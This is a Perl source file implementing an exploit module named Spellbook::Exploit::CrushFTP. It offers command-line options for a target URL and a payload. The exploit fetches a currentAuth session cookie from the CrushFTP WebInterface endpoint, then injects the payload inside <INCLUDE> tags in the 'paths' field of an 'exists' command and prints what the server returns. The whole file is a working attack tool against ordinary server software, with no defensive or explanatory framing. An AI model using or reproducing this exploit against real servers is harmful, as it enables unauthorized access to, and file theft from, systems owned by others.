package Spellbook::Exploit::CrushFTP {
    use strict;
    use warnings;
    use Mojo::UserAgent;
    use Getopt::Long;

    sub new {
        my ($class, $parameters) = @_;

        my ($url, $payload, $help);
        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "url=s"     => \$url,
            "payload=s" => \$payload,
            "help"      => \$help
        );

        if ($help) {
            return "
                \rExploit::CrushFTP
                \r========================================
                \r-h, --help      See this menu
                \r-u, --url       Define the targeted CrushFTP server URL
                \r-p, --payload   Set the payload to run on the target\n\n";
        }

        unless ($url && $payload) {
            return "\nMissing required arguments. Use --help for usage instructions.\n\n";
        }

        my $self = bless({}, $class);
        $self -> {url} = $url;
        $self -> {payload} = $payload;
        return $self;
    }

    sub exploit {
        my ($self) = @_;
        my $url = $self -> {url};
        my $payload = $self -> {payload};

        my $ua = Mojo::UserAgent -> new;
        $ua -> insecure(1);

        my $url2 = "$url/WebInterface/";
        my $response = $ua -> post($url2) -> result;
        my $cookies = $response -> headers -> header('Set-Cookie');

        my ($currentAuth) = $cookies =~ /currentAuth=([^;]+)/;

        my $data = {
            'command' => 'exists',
            'paths'   => "<INCLUDE>$payload</INCLUDE>",
            'c2f'     => $currentAuth,
        };

        $response = $ua -> post($url2 => form => $data) -> result;
        print $response -> body;
    }

    1;
}
